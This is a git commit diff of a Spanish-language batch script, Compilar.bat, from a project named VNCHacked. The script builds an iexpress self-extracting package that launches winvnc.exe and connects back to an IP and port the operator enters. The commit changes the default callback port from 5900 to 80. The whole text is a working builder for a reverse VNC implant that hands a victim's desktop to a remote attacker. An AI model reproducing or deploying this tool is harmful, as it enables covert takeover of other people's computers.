7f7ed1dc1a839ba9b42ae7dc819c789bbc5016c4
jgc777 <90793213+jgc777@users.noreply.github.com>
2025-01-10 23:25:03 +0100

    .

--- VNCHacked/Compilar.bat
+++ VNCHacked/Compilar.bat
@@ -1,8 +1,8 @@
 @echo off
 title Compilador de VNCHacked
 set /p ip=Introduzca la IP del equipo con VNCHacker o UltraVNC client: 
-set /p puerto=Introduzca el puerto de VNCHacker (por defecto 5900): 
-if not defined puerto set puerto=5900
+set /p puerto=Introduzca el puerto de VNCHacker (por defecto 80): 
+if not defined puerto set puerto=80
 echo cmd /c "start winvnc.exe -run && start winvnc.exe -connect %ip%::%puerto%">vnc.bat
 iexpress /n VNCHacked.sed
 del /q vnc.bat
